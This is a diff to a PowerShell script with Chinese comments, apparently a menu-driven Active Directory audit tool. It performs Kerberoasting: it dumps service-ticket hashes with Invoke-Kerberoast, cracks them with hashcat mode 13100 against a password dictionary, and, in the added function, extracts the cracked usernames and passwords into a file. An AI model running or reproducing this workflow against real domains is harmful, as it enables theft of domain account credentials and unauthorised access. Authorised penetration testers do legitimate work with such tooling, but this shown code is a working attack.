@@ -117,9 +117,10 @@ function Get-ServiceTicket{
 	Param(
 		[String] $krbstHashFileName
 	)
-	Import-Module ./kerberoast/Invoke-Kerberoast.ps1
+	Import-Module .\kerberoast\Invoke-Kerberoast.ps1
 	# Set-Content 以ANSI编码方式保存文件；Out-File 默认以Unicode方式保存文件，因而需要指定编码格式
 	Invoke-Kerberoast -OutputFormat Hashcat|select hash|%{$_.Hash}|Out-File $krbstHashFileName -Encoding ascii
+	Write-Host "将SPN的ST Hash值保存到" $krbstHashFileName "中"
 }
 # 引入tgscrack来爆破下载下来的凭据
 function Crack-ServiceTicket{
@@ -127,9 +128,14 @@ function Crack-ServiceTicket{
 		[String] $krbstHashFileName,
 		[String] $passwdDictFileName
 	)
+
 	Write-Host "正在爆破中ing.......请稍等"
 	if((Test-Path $krbstHashFileName) -and (Test-Path $passwdDictFileName)){
-		.\hashcat\hashcat64.exe -m 13100 -a 0 $krbstHashFileName $passwdDictFileName -o ".\succeed.txt" --force
+		cd ./hashcat
+		$krbstHashFileName = "..\krbstHash.txt"
+		$passwdDictFileName = "..\Dicts\JCPasswd.txt"
+		.\hashcat64.exe -m 13100 -a 0 $krbstHashFileName $passwdDictFileName -o "..\result\succeed.txt" --force -O
+		cd ..
 		if(Test-Path ".\result\succeed.txt"){
 			$hashAndPasswdList = Get-Content ".\result\succeed.txt"
 			$userAndPasswdList = New-Object System.Collections.ArrayList
@@ -150,6 +156,26 @@ function Crack-ServiceTicket{
 	}
 	Write-Host "将破解出的用户名和密码保存到.\result\userAndPasswdList.txt文件中去"
 	$userAndPasswdList | Out-File ".\result\userAndPasswdList.txt"
+}
+# 将hashcat爆破成功后的文件分离为用户名|#|密码
+function Extract-UserAndPasswd{
+        if(Test-Path ".\result\succeed.txt"){
+
+			$hashAndPasswdList = Get-Content ".\result\succeed.txt"
+			$userAndPasswdList = New-Object System.Collections.ArrayList
+			foreach($item in $hashAndPasswdList){
+				$userStr = ($item.split("$")[3]).split("*")[1]
+				$passwdStr = $item.split(":")[1]
+				$userAndPasswd = $userStr + "|#|" + $passwdStr
+				Write-Host -ForegroundColor Green "【+】" $userAndPasswd
+				$userAndPasswdList.add($userAndPasswd) | Out-Null
+			}
+			Write-Host "将破解出的用户名和密码保存到.\result\userAndPasswdList.txt文件中去"
+			$userAndPasswdList | Out-File ".\result\userAndPasswdList2.txt"
+	}else{
+		Write-Host "不存在.\result\succeed.txt"
+		return $false
+	}
 }
 function LDAPCheck{
 	Write-Host -ForegroundColor Yellow "使用该项功能需注意，很容易锁住账户"
@@ -185,6 +211,7 @@ Do {
 	Write-Host "| 5 删除注册的SPN"
 	Write-Host "| 6 使用SPN审计获得的密码通过LDAP方式再次进行审计"
 	Write-Host "| 7 全部运行"
+	Write-Host "| 8 单独：提取用户名和密码"
 	Write-Host "| 0 EXIT"
 	$choice = Read-Host "请选择一个选项进行操作`n>>"
 	switch($choice){
@@ -231,6 +258,11 @@ Do {
 			# 5. 删除SPN
 			Write-Host "下面将要为注册SPN成功的域用户账户删除SPN"
 			Del-SPN $sucSPNList $sucUserList
+			break
+		}
+		8 {
+			Write-Host "从succeed.txt文件中提取用户名和密码"
+			Extract-UserAndPasswd
 			break
 		}
 		0 {	
